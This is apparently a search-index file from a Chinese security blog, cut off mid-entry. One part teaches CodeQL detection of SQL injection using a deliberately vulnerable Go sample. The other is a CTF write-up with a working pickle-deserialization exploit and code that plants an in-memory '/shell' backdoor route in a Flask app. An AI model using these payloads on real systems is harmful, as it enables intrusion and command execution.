\u67e5\u8be2\u8c13\u8bcd\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u5728\u5f53\u524d\u6a21\u5757\u4e2d\u5b9a\u4e49\u6216\u8005\u4ece\u5176\u4ed6\u6a21\u5757\u4e2d\u5bfc\u5165","title":"\u67e5\u8be2(Query)"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#\u9009\u62e9\u5b50\u53e5","text":"\u9009\u62e9\u5b50\u53e5\u7684\u683c\u5f0f\u5982\u4e0b: [from] /* ... variable declarations ... */ [where] /* ... logical formula ... */ select /* ... expressions ... */ \u5176\u4e2dfrom\u548cwhere\u8bed\u53e5\u662f\u53ef\u9009\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u5728from\u4e2d\u5b9a\u4e49\u53d8\u91cf\uff0c\u5728where\u4e2d\u7ed9\u53d8\u91cf\u8d4b\u503c\u548c\u5bf9\u67e5\u8be2\u7ed3\u679c\u7684\u8fc7\u6ee4\uff0c\u6700\u540e\u5728select\u4e2d\u663e\u793a\u7ed3\u679c\u3002 \u5728select\u8bed\u53e5\u4e2d\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u5173\u952e\u5b57: - as \u5173\u952e\u5b57\uff0c\u540e\u9762\u8ddf\u968f\u4e00\u4e2a\u540d\u5b57\u3002\u4f5c\u7528\u76f8\u5f53\u4e8esql\u4e2d\u7684 as \uff0c\u4e3a\u7ed3\u679c\u5217\u63d0\u4f9b\u4e86\u4e00\u4e2a\"\u6807\u7b7e\"\uff0c\u5e76\u5141\u8bb8\u5728\u540e\u7eed\u7684select\u8868\u8fbe\u5f0f\u4e2d\u4f7f\u7528\u5b83\u4eec\u3002 - order by \u5173\u952e\u5b57\uff0c\u540e\u9762\u8ddf\u968f\u4e00\u4e2a\u4e00\u4e2a\u7ed3\u679c\u5217\u540d\u3002\u4f5c\u7528\u76f8\u5f53\u4e8esql\u4e2d\u7684 order by \uff0c\u7528\u4e8e\u6392\u5e8f\u7ed3\u679c\uff0c\u5e76\u4e14\u5728\u7ed3\u679c\u5217\u540d\u540e\u53ef\u9009 asc (\u5347\u5e8f)\u6216 desc (\u964d\u5e8f)\u5173\u952e\u5b57\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: from int x, int y where x = 3 and y in [0 .. 2] select x, y, x * y as product, \"product: \" + product","title":"\u9009\u62e9\u5b50\u53e5"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#\u6c61\u70b9\u5206\u6790\u5b9a\u4e49","text":"\u6c61\u70b9\u5206\u6790\u53ef\u4ee5\u62bd\u8c61\u6210\u4e00\u4e2a\u4e09\u5143\u7ec4 <sources,sinks,processor> \u7684\u5f62\u5f0f\uff0c\u5176\u4e2d: - source \u5373\u6c61\u70b9\u6e90 \uff0c\u4ee3\u8868\u76f4\u63a5\u5f15\u5165\u4e0d\u53d7\u4fe1\u4efb\u7684\u6570\u636e\u6216\u8005\u673a\u5bc6\u6570\u636e\u5230\u7cfb\u7edf\u4e2d - sink \u5373\u6c61\u70b9\u6c47\u805a\u70b9 \uff0c\u4ee3\u8868\u76f4\u63a5\u4ea7\u751f\u5b89\u5168\u654f\u611f\u64cd\u4f5c\uff08\u8fdd\u53cd\u6570\u636e\u5b8c\u6574\u6027\uff09\u6216\u8005\u6cc4\u9732\u9690\u79c1\u6570\u636e\u5230\u5916\u754c\uff08\u8fdd\u53cd\u6570\u636e\u4fdd\u5bc6\u6027\uff09 - sanitizer \u5373\u65e0\u5bb3\u5904\u7406 \uff0c\u4ee3\u8868\u901a\u8fc7\u6570\u636e\u52a0\u5bc6\u6216\u8005\u79fb\u9664\u5371\u5bb3\u64cd\u4f5c\u7b49\u624b\u6bb5\u4f7f\u6570\u636e\u4f20\u64ad\u4e0d\u518d\u5bf9\u8f6f\u4ef6\u7cfb\u7edf\u7684\u4fe1\u606f\u5b89\u5168\u4ea7\u751f\u5371\u5bb3","title":"\u6c61\u70b9\u5206\u6790\u5b9a\u4e49"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#golang-sql\u6ce8\u5165\u68c0\u6d4b","text":"","title":"golang sql\u6ce8\u5165\u68c0\u6d4b"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#\u4ec0\u4e48\u662fsql\u6ce8\u5165","text":"\u6211\u4eec\u5148\u770b\u770b\u767e\u79d1\u4e0a\u662f\u600e\u4e48\u8bf4\u7684 SQL\u6ce8\u5165\u5373\u662f\u6307web\u5e94\u7528\u7a0b\u5e8f\u5bf9\u7528\u6237\u8f93\u5165\u6570\u636e\u7684\u5408\u6cd5\u6027\u6ca1\u6709\u5224\u65ad\u6216\u8fc7\u6ee4\u4e0d\u4e25\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728web\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4e8b\u5148\u5b9a\u4e49\u597d\u7684\u67e5\u8be2\u8bed\u53e5\u7684\u7ed3\u5c3e\u4e0a\u6dfb\u52a0\u989d\u5916\u7684SQL\u8bed\u53e5\uff0c\u5728\u7ba1\u7406\u5458\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u975e\u6cd5\u64cd\u4f5c\uff0c\u4ee5\u6b64\u6765\u5b9e\u73b0\u6b3a\u9a97\u6570\u636e\u5e93\u670d\u52a1\u5668\u6267\u884c\u975e\u6388\u6743\u7684\u4efb\u610f\u67e5\u8be2\uff0c\u4ece\u800c\u8fdb\u4e00\u6b65\u5f97\u5230\u76f8\u5e94\u7684\u6570\u636e\u4fe1\u606f\u3002 \u770b\u5b8c\u5b98\u65b9\u7684\u4ecb\u7ecd\uff0c\u6211\u5728\u6765\u8bf4\u4e0b\u6211\u7406\u89e3\u7684sql\u6ce8\u5165\u662f\u4ec0\u4e48 sql\u6ce8\u5165\u5176\u5b9e\u5c31\u662f \u4e0d\u53d7\u4fe1\u4efb\u7684\u7528\u6237\u8f93\u5165 \u901a\u8fc7\u5b57\u7b26\u62fc\u63a5\u7684\u65b9\u5f0f \u8fdb\u5165sql\u8bed\u53e5 \u4e2d\u4ece\u800c\u5bfc\u81f4sql\u8bed\u53e5\u7684\u8bed\u4e49\u6539\u53d8\uff0c\u901a\u8fc7\u8fd9\u79cd\u6076\u610fsql\u8bed\u53e5\u5b9e\u73b0\u7684\u4e00\u79cd\u653b\u51fb\u3002 \u8fd9\u91cc\u6709\u4e24\u4e2a\u5173\u952e\u70b9\uff0c\u4e00\u4e2a\u662f \u4e0d\u53d7\u4fe1\u4efb\u7684\u7528\u6237\u8f93\u5165 \uff0c\u4e00\u4e2a\u662f \u8fdb\u5165sql\u8bed\u53e5 \uff0c\u53ef\u4ee5\u770b\u5230\u5b83\u4eec\u5c31\u7c7b\u4f3c\u4e8e\u4e0a\u9762\u6c61\u70b9\u5206\u6790\u8bf4\u5230\u7684 source \u548c sink","title":"\u4ec0\u4e48\u662fsql\u6ce8\u5165\uff1f"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#\u4e00\u6bb5\u7b80\u5355\u7684sql\u6ce8\u5165\u4ee3\u7801","text":"package main import ( \"flag\" \"fmt\" \"log\" \"github.com/gin-gonic/gin\" \"database/sql\" _ \"github.com/go-sql-driver/mysql\" ) var ( Addr = \"0.0.0.0:8080\" ) func init () { flag . StringVar ( & Addr , \"addr\" , \"0.0.0.0:8080\" , \"Server listen address\" ) flag . Parse () } func main () { db , err := sql . Open ( \"mysql\" , \"root:root@tcp(127.0.0.1:3306)/test\" ) defer db . Close () if err != nil { panic ( err ) } err = db . Ping () if err != nil { panic ( err ) } router := gin . Default () router . GET ( \"/inject\" , func ( ctx * gin . Context ) { var ( username string ) // source id := ctx . Query ( \"id\" ) if id == \"\" { id = \"1\" } id2 := id + \"hhhhhh\" // sink rows , err := db . Query ( \"select username from users where id = \" + id2 ) if err != nil { log . Panic ( err ) } defer rows . Close () for rows . Next () { err := rows . Scan ( & username ) if err != nil { log . Panic ( err ) } } ctx . String ( 200 , username ) }) router . Run ( Addr ) }","title":"\u4e00\u6bb5\u7b80\u5355\u7684sql\u6ce8\u5165\u4ee3\u7801"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#\u5229\u7528codeql\u68c0\u6d4bsql\u6ce8\u5165","text":"\u6211\u4eec\u8fd9\u5148\u5c1d\u8bd5\u81ea\u5df1\u53bb\u7f16\u5199\u4e00\u4e2aCodeQL\u6765\u68c0\u6d4b\u8fd9\u6bb5\u4ee3\u7801\u4e2d\u5b58\u5728\u7684sql\u6ce8\u5165\uff0c\u8fd9\u91cc\u5229\u7528\u4e86CodeQL\u81ea\u5e26\u7684\u4e00\u4e2a\u6c61\u70b9\u8ffd\u8e2a\u529f\u80fd from Method GinQuery, DataFlow::CallNode GinQueryCallNode, Method DBQuery, DataFlow::CallNode DBQueryCallNode, DataFlow::Node sink, DataFlow::Node src where GinQuery.hasQualifiedName(\"github.com/gin-gonic/gin\",\"Context\",\"Query\") and GinQueryCallNode = GinQuery.getACall() and DBQuery.hasQualifiedName(\"database/sql\",\"DB\",\"Query\") and DBQueryCallNode = DBQuery.getACall() and src = GinQueryCallNode.getResult() and sink = DataFlow::exprNode(DBQueryCallNode.getCall().getArgument(0)) and TaintTracking::localTaint(src, sink) select src, sink \u6700\u540e\u6267\u884c\u7ed3\u679c\u5982\u4e0b","title":"\u5229\u7528CodeQL\u68c0\u6d4bsql\u6ce8\u5165"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/#\u5b98\u65b9\u6807\u51c6\u5e93\u68c0\u6d4bsql\u6ce8\u5165","text":"\u5b98\u65b9\u6807\u51c6\u5e93\u4e2d\u4e5f\u5b58\u5728sql\u6ce8\u5165\u7684\u68c0\u6d4b\uff0c\u4f4d\u4e8e codeql-go/lib/src/Security/SqlInjection.ql \uff0c\u6211\u4eec\u6765\u5b66\u4e60\u4e00\u4e0b\u5b98\u65b9\u4ee3\u7801\u662f\u600e\u4e48\u7f16\u5199\u7684 \u5b98\u65b9\u6e90\u7801\u5982\u4e0b: /** * @name Database query built from user-controlled sources * @description Building a database query from user-controlled sources is vulnerable to insertion of * malicious code by the user. * @kind path-problem * @problem.severity error * @security-severity 8.8 * @precision high * @id go/sql-injection * @tags security * external/cwe/cwe-089 */ import go import semmle.go.security.SqlInjection import DataFlow::PathGraph from SqlInjection::Configuration cfg, DataFlow::PathNode source, DataFlow::PathNode sink where cfg.hasFlowPath(source, sink) select sink.getNode(), source, sink, \"This query depends on $@.\", source.getNode(), \"a user-provided value\" \u53ef\u4ee5\u770b\u5230\u4ee3\u7801\u5f88\u7b80\u77ed\uff0c\u8bc1\u660e\u771f\u5b9e\u7684\u5b9e\u73b0\u5e76\u4e0d\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u6309\u4e0bCtrl\u8ddf\u8fdbSqlInjection::Configuration\u770b\u770b \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230Configuration\u7ee7\u627f\u4e86 TaintTracking::Configuration \uff0c\u8fd9\u4e2a\u662f\u5b98\u65b9\u81ea\u5e26\u7684\u6c61\u70b9\u8ffd\u8e2a\u7684\u914d\u7f6e\uff0c\u6211\u4eec\u53ea\u8981\u5b9e\u73b0 isSource \u8c13\u8bcd\u548c isSink \u8c13\u8bcd\u5373\u53ef\uff0c\u6211\u4eec\u7ee7\u7eed\u8ddf\u8fdb Source \u7c7b \u53ef\u4ee5\u770b\u5230 Source \u7c7b\u5c31\u662f\u4e2a\u7ee7\u627f\u4e86 DataFlow::Node \u7684\u62bd\u8c61\u7c7b\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u8981\u53bb\u627e\u5b83\u7684\u5b50\u7c7b \u5b50\u7c7b\u5c31\u5728\u6700\u4e0b\u9762\uff0c\u5b83\u53c8\u662f\"\u7ee7\u627f\"\u4e8e UntrustedFlowSource \u7ee7\u7eed\u8ddf\u8fdb UntrustedFlowSource \uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u6709\u4e9b\u6bd4\u8f83\u62bd\u8c61\u7684\u4ee3\u7801\uff0c\u5b9e\u9645\u4e0a\u8fd9\u7b49\u4ef7\u4e8e UntrustedFlowSource \u53c8\"\u7ee7\u627f\"\u4e8e UntrustedFlowSource::Range UntrustedFlowSource::Range \u5c31\u5728\u4e0b\u9762\uff0c\u5b83\u53c8\u662f\u4e00\u4e2a\u7ee7\u627f\u4e86 DataFlow::Node \u7684\u62bd\u8c61\u7c7b\uff0c\u6211\u4eec\u7ee7\u7eed\u53bb\u627e\u5b83\u7684\u5b50\u7c7b \u901a\u8fc7vscode\u641c\u7d22 extends UntrustedFlowSource::Range \uff0c\u53ef\u4ee5\u770b\u5230\u8be5\u7c7b\u6709\u5f88\u591a\u5b50\u7c7b\uff0c\u90fd\u662f\u4e3a\u4e86\u9002\u914dgolang\u4e2d\u6bd4\u8f83\u51fa\u540d\u7684web\u6846\u67b6(\u5982Beego\uff0cChi\uff0cGin\u7b49) \u8fd9\u91cc\u6211\u4eec\u7684\u4ee3\u7801\u662f\u7528Gin\u4f5c\u4e3a\u6846\u67b6\u7684\uff0c\u6211\u4eec\u5c31\u4ee5\u5176\u4e3a\u4f8b\uff0c\u67e5\u770b Gin.qll \uff0c\u91cc\u9762\u67092\u4e2a\u7c7b\u7ee7\u627f\u4e86 extends UntrustedFlowSource::Range \uff0c\u5176\u4e2d\u4e00\u4e2a\u7c7b\u7684\u4ee3\u7801\u5982\u4e0b: \u6700\u4e0a\u9762\u8fd9\u4e00\u5757\u7684\u610f\u601d\u662f\u53bb\u5bfb\u627e\u4e00\u4e2a\u65b9\u6cd5\u8c03\u7528\uff0c\u5e76\u4e14\u83b7\u53d6\u4ed6\u7684\u8fd4\u56de\u7ed3\u679c\u4f5c\u4e3asource \u4e0b\u9762\u4e00\u5757\u7684\u610f\u601d\u662f\u5bfb\u627e\u7c7b\u4e2d\u7684\u5b57\u6bb5(Accepted\u6216Params\uff0c\u662f\u4e00\u4e2a\u6570\u7ec4)\uff0c\u5e76\u4e14\u5728\u5176\u8bfb\u53d6\u5143\u7d20\u65f6\u83b7\u53d6\u4ed6\u7684\u503c\u4f5c\u4e3asource \u53e6\u5916\u4e00\u4e2a\u7c7b\u7684\u4ee3\u7801\u5982\u4e0b: \u8fd9\u6bb5\u4ee3\u7801\u7684\u610f\u601d\u662f\u8fd9\u4e9b\u51fd\u6570\u8c03\u7528\u65f6\u83b7\u53d6\u5176\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f5c\u4e3asource \u4e0a\u9762\u7684\u4ee3\u7801\u53ef\u80fd\u6709\u70b9\u590d\u6742\uff0c\u6211\u4eec\u7a0d\u5fae\u7b80\u5316\u4e00\u4e0b\uff0c\u53ef\u4ee5\u5f97\u5230\u4ee5\u4e0b\u4ee3\u7801 import go abstract class Source extends DataFlow::Node { } class Node1 extends Source { Node1() { exists(DataFlow::MethodCallNode call, string methodName | call.getTarget().hasQualifiedName(\"github.com/gin-gonic/gin\", \"Context\", methodName) and methodName in [ \"FullPath\", \"GetHeader\", \"QueryArray\", \"Query\", \"PostFormArray\", \"PostForm\", \"Param\", \"GetStringSlice\", \"GetString\", \"GetRawData\", \"ClientIP\", \"ContentType\", \"Cookie\", \"GetQueryArray\", \"GetQuery\", \"GetPostFormArray\", \"GetPostForm\", \"DefaultPostForm\", \"DefaultQuery\", \"GetPostFormMap\", \"GetQueryMap\", \"GetStringMap\", \"GetStringMapString\", \"GetStringMapStringSlice\", \"PostFormMap\", \"QueryMap\" ] | this = call.getResult(0) ) } } from Source src select src \u8fd9\u91cc\u5982\u679c\u5bf9CodeQL\u4e0d\u591f\u719f\u6089\u53ef\u80fd\u4f1a\u4ea7\u751f\u7591\u95ee\uff0c\u4e3a\u4ec0\u4e48Source\u7684\u5b50\u7c7bNode1\u7684\u7279\u5f81\u8c13\u8bcd(\u53ef\u4ee5\u7406\u89e3\u4e3a\u5176\u4ed6\u8bed\u8a00\u4e2d\u7684\u6784\u9020\u51fd\u6570)\u4f1a\u5bf9Source\u4ea7\u751f\u9650\u5236\u4f5c\u7528\u5462\uff1f\u5176\u5b9e\u8fd9\u4e2a\u5c31\u662fCodeQL\u7684\u7279\u70b9\uff0c\u5b50\u7c7b\u7684\u7279\u5f81\u8c13\u8bcd\u4f1a\u9650\u5b9a\u7236\u7c7b\u3002 sink\u7684\u5206\u6790\u548csource\u540c\u7406\uff0c\u6211\u4eec\u8fd9\u91cc\u5c31\u4e0d\u518d\u5206\u6790\u4e86\u3002\u53ef\u4ee5\u770b\u5230\u5176\u5b9eCodeQL\u5b98\u65b9\u5c31\u662f\u5c06\u5f88\u591a\u5e38\u7528\u7684Web\u6846\u67b6\u7684source\u548csink\u90fd\u5199\u4e86\u4e00\u904d\uff0c\u8fd9\u6837\u5f53\u6211\u4eec\u4f7f\u7528\u8fd9\u4e9bWeb\u6846\u67b6\u7f16\u5199\u4ee3\u7801\u65f6\u5c31\u53ef\u4ee5\u4f7f\u7528CodeQL\u6807\u51c6\u5e93\u6765\u68c0\u6d4b\u6211\u4eec\u7684\u4ee3\u7801\u662f\u5426\u5b58\u5728\u6f0f\u6d1e\u4e86\u3002 \u6211\u4eec\u6765\u8fd0\u884c\u4e0b\u5b98\u65b9\u7684\u6807\u51c6\u5e93\uff0c\u53ef\u4ee5\u5f97\u5230\u76f8\u540c\u7684\u7ed3\u679c:","title":"\u5b98\u65b9\u6807\u51c6\u5e93\u68c0\u6d4bsql\u6ce8\u5165"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/","tags":["python","flask"],"text":"flask\u4e0d\u51fa\u7f51\u56de\u663e\u65b9\u5f0f # \u524d\u8a00 # \u7814\u7a76\u8fd9\u4e2a\u95ee\u9898\u4e3b\u8981\u662f\u6253\u6bd4\u8d5b\u7684\u65f6\u5019\u9047\u5230\u4e86\uff0c\u9898\u76ee\u5185\u5bb9\u5927\u6982\u662f\u8fd9\u6837\u7684 # app.py from flask import Flask , request , session , render_template_string , url_for , redirect import pickle import io import sys import base64 import random import subprocess from config import notadmin app = Flask ( __name__ ) class RestrictedUnpickler ( pickle . Unpickler ): def find_class ( self , module , name ): if module in [ 'config' ] and \"__\" not in name : return getattr ( sys . modules [ module ], name ) raise pickle . UnpicklingError ( \"' %s . %s ' not allowed\" % ( module , name )) def restricted_loads ( s ): \"\"\"Helper function analogous to pickle.loads().\"\"\" return RestrictedUnpickler ( io . BytesIO ( s )) . load () @app . route ( '/' ) def index (): info = request . args . get ( 'name' , '' ) if info is not '' : x = base64 . b64decode ( info ) User = restricted_loads ( x ) return render_template_string ( 'Hello' ) if __name__ == '__main__' : app . run ( host = '0.0.0.0' , debug = True , port = 5000 ) # config.py notadmin = { \"admin\" : \"no\" } def backdoor ( cmd ): if notadmin [ \"admin\" ] == \"yes\" : s = '' . join ( cmd ) eval ( s ) \u53ef\u4ee5\u770b\u51fa\u6765\u662f\u4e2a\u7b80\u5355\u7684pickle\u53cd\u5e8f\u5217\u5316\uff0c\u8fd9\u4e0d\u662f\u672c\u6b21\u7684\u91cd\u70b9\uff0c\u91cd\u70b9\u662f\u8fd9\u9053\u9898\u5728eval\u540e\u5982\u4f55\u56de\u663e\uff0c\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u60f3\u5230\u7684\u662f\u53cd\u5f39shell\uff0c\u4f46\u662f\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u76ee\u6807\u673a\u5668\u5e76\u4e0d\u51fa\u7f51\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5bfb\u627e\u5176\u4ed6\u7684\u65b9\u5f0f\u53bb\u8ba9\u6211\u4eec\u7684\u547d\u4ee4\u56de\u663e debug\u6a21\u5f0f\u4e0b\u5229\u7528\u62a5\u9519 # \u4f17\u6240\u5468\u77e5\uff0c\u5728flask\u4e2d\u5982\u679c\u5f00\u542f\u4e86debug\u6a21\u5f0f\uff0c\u62a5\u9519\u662f\u4f1a\u663e\u793a\u8be6\u7ec6\u4fe1\u606f\u7684\uff0c\u6bd4\u8d5b\u4e2ddebug\u6a21\u5f0f\u901a\u5e38\u8003\u70b9\u662f\u6784\u9020pin\u7801\uff0c\u4f46\u662f\u6211\u4eec\u8fd9\u91cc\u60f3\u5230\uff0c\u53ef\u4ee5\u901a\u8fc7\u624b\u52a8\u63a7\u5236\u62a5\u9519\u7684\u65b9\u5f0f\u6765\u8ba9\u6211\u4eec\u7684\u547d\u4ee4\u56de\u663e\u3002 \u7b80\u5355\u5730\u6784\u9020exp\uff0c\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662feval\u5e76\u4e0d\u80fd\u6267\u884cpython\u8bed\u53e5\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5229\u7528eval\u53bb\u8c03\u7528exec\u6765\u5b9e\u73b0\u624b\u52a8\u629b\u51fa\u62a5\u9519 from base64 import b64encode from urllib.parse import quote def base64_encode ( s : str , encoding = 'utf-8' ) -> str : return b64encode ( s . encode ()) . decode ( encoding = encoding ) exc = \"raise Exception(__import__('os').popen('whoami').read())\" exc = base64_encode ( exc ) . encode () opcode = b '''cconfig notadmin (S'admin' S'yes' u0(cconfig backdoor (S'exec(__import__(\"base64\").b64decode(b\" %s \"))' lo.''' % ( exc ) print ( quote ( b64encode ( opcode ) . decode ())) \u53ef\u4ee5\u770b\u5230\u6211\u4eec\u6210\u529f\u901a\u8fc7Exception\u53bb\u62ff\u5230\u4e86\u56de\u663e \u975edebug\u6a21\u5f0f\u4e0b\u5229\u7528\u5185\u5b58\u9a6c # \u8fd9\u91cc\u4e86\u53c2\u8003\u6587\u7ae0: iceyhexman/flask memory shell \u8fd9\u7bc7\u6587\u7ae0\u662fssti\u4e0b\u5982\u4f55\u5229\u7528flask\u53bb\u6dfb\u52a0\u4e00\u4e2a\u540e\u95e8\u8def\u7531\uff0c\u6211\u4eec\u53ef\u4ee5\u53c2\u8003\u4ed6\u7684\u60f3\u6cd5\u6765\u5c1d\u8bd5\u83b7\u53d6app\u6dfb\u52a0\u540e\u95e8\u8def\u7531\uff0c\u8fd9\u91cc\u4e00\u4e2a\u96be\u70b9\u662f\u5982\u4f55\u62ff\u5230\u6b63\u5728\u8fd0\u884c\u7684app \u5931\u8d25\u7684\u5c1d\u8bd5: \u76f4\u63a5import\u6a21\u5757\u83b7\u53d6app # \u4e00\u5f00\u59cb\u60f3\u5230\u7684\u65b9\u6cd5\u662f\u76f4\u63a5 import app.py \u6765\u83b7\u53d6app\uff0c\u4f46\u662f\u4e8b\u5b9e\u8bc1\u660e\u6b64app\u975e\u5f7capp\uff0c\u6dfb\u52a0\u4e86\u8def\u7531\u4f46\u662f\u5e76\u4e0d\u80fd\u8bbf\u95ee\u5230\uff0c\u5e94\u8be5\u662f\u4e00\u4e2a\u5168\u65b0\u7684app \u6210\u529f\u7684\u5c1d\u8bd5: sys.modules # sys.modules\u662f\u4e00\u4e2a\u5168\u5c40\u5b57\u5178\uff0c\u8be5\u5b57\u5178\u662fpython\u542f\u52a8\u540e\u5c31\u52a0\u8f7d\u5728\u5185\u5b58\u4e2d\u3002\u6bcf\u5f53\u7a0b\u5e8f\u5458\u5bfc\u5165\u65b0\u7684\u6a21\u5757\uff0csys.modules\u90fd\u5c06\u8bb0\u5f55\u8fd9\u4e9b\u6a21\u5757\u3002\u5b57\u5178sys.modules\u5bf9\u4e8e\u52a0\u8f7d\u6a21\u5757\u8d77\u5230\u4e86\u7f13\u51b2\u7684\u4f5c\u7528\u3002\u5f53\u67d0\u4e2a\u6a21\u5757\u7b2c\u4e00\u6b21\u5bfc\u5165\uff0c\u5b57\u5178sys.modules\u5c06\u81ea\u52a8\u8bb0\u5f55\u8be5\u6a21\u5757\u3002\u5f53\u7b2c\u4e8c\u6b21\u518d\u5bfc\u5165\u8be5\u6a21\u5757\u65f6\uff0cpython\u4f1a\u76f4\u63a5\u5230\u5b57\u5178\u4e2d\u67e5\u627e\uff0c\u4ece\u800c\u52a0\u5feb\u4e86\u7a0b\u5e8f\u8fd0\u884c\u7684\u901f\u5ea6\u3002 \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7sys.modules\u62ff\u5230\u5f53\u524d\u5df2\u7ecf\u5bfc\u5165\u7684\u6a21\u5757\uff0c\u5e76\u4e14\u83b7\u53d6\u6a21\u5757\u4e2d\u7684\u5c5e\u6027\uff0c\u7531\u4e8e\u6211\u4eec\u6700\u7ec8\u7684eval\u662f\u5728app.py\u4e2d\u6267\u884c\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 sys.modules['__main__'] \u6765\u83b7\u53d6\u5f53\u524d\u7684\u6a21\u5757\uff0c\u6211\u4eec\u5199\u4e2a\u7b80\u5355\u7684\u6d4b\u8bd5\u6765\u770b\u770b\u4e0a\u9762\u7684app\u4e0e\u5b9e\u9645\u7684app\u662f\u5426\u76f8\u540c import sys import app app1 = sys . modules [ '__main__' ] . __dict__ [ 'app' ] app2 = app . app print ( id ( app1 )) print ( id ( app2 )) \u53ef\u4ee5\u770b\u5230app\u7684id\u5e76\u4e0d\u76f8\u540c\uff0c\u6240\u4ee5\u4ed6\u4eec\u5e76\u975e\u76f8\u540c\u7684app \u8fd9\u91cc\u6211\u4eec\u5c1d\u8bd5\u76f4\u63a5\u6dfb\u52a0\u540e\u95e8\u8def\u7531\uff0c\u4f1a\u53d1\u73b0\u5b58\u5728\u62a5\u9519 import sys import os sys . modules [ '__main__' ] . __dict__ [ 'app' ] . add_url_rule ( '/shell' , 'shell' , lambda : os . popen ( 'dir' ) . read ()) \u8fd9\u4e2a\u62a5\u9519\u662f\u7531\u4e8e\u6211\u4eec\u5728\u7b2c\u4e00\u4e2a\u8bf7\u6c42\u5904\u7406\u540e\u8c03\u7528\u4e86\u8bbe\u7f6e\u51fd\u6570(add url rule)\uff0c\u6b64\u62a5\u9519\u53ea\u4f1a\u5728debug\u6a21\u5f0f\u4e0b\u89e6\u53d1\uff0c\u53ef\u4ee5\u53c2\u8003\u4f7f\u7528\u4e86Flask\u6846\u67b6\u7684\u5de5\u5177\u7684issue: - https://github.com/alexmclarty/mirror/issues/6 - https://github.com/pallets/flask/issues/2616 \u6240\u4ee5\u6211\u4eec\u9700\u8981\u5728\u975edebug\u6a21\u5f0f\u4e0b\u624d\u80fd\u6210\u529f\u6dfb\u52a0\u540e\u95e8\u8def\u7531(\u53c8\u6216\u8005\u6211\u4eec\u76f4\u63a5\u8bbe\u7f6edebug=False\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898) import sys sys . modules [ '__main__' ] . __dict__ [ 'app' ] . debug = False sys . modules [ '__main__' ] . __dict__ [ 'app' ] . add_url_rule ( '/shell' , 'shell' , lambda : __import__ ( 'os' ) . popen ( 'dir' ) . read ())","title":"flask\u4e0d\u51fa\u7f51\u56de\u663e\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/#flask\u4e0d\u51fa\u7f51\u56de\u663e\u65b9\u5f0f","text":"","title":"flask\u4e0d\u51fa\u7f51\u56de\u663e\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/#\u524d\u8a00","text":"\u7814\u7a76\u8fd9\u4e2a\u95ee\u9898\u4e3b\u8981\u662f\u6253\u6bd4\u8d5b\u7684\u65f6\u5019\u9047\u5230\u4e86\uff0c\u9898\u76ee\u5185\u5bb9\u5927\u6982\u662f\u8fd9\u6837\u7684 # app.py from flask import Flask , request , session , render_template_string , url_for , redirect import pickle import io import sys import base64 import random import subprocess from config import notadmin app = Flask ( __name__ ) class RestrictedUnpickler ( pickle . Unpickler ): def find_class ( self , module , name ): if module in [ 'config' ] and \"__\" not in name : return getattr ( sys . modules [ module ], name ) raise pickle . UnpicklingError ( \"' %s . %s ' not allowed\" % ( module , name )) def restricted_loads ( s ): \"\"\"Helper function analogous to pickle.loads().\"\"\" return RestrictedUnpickler 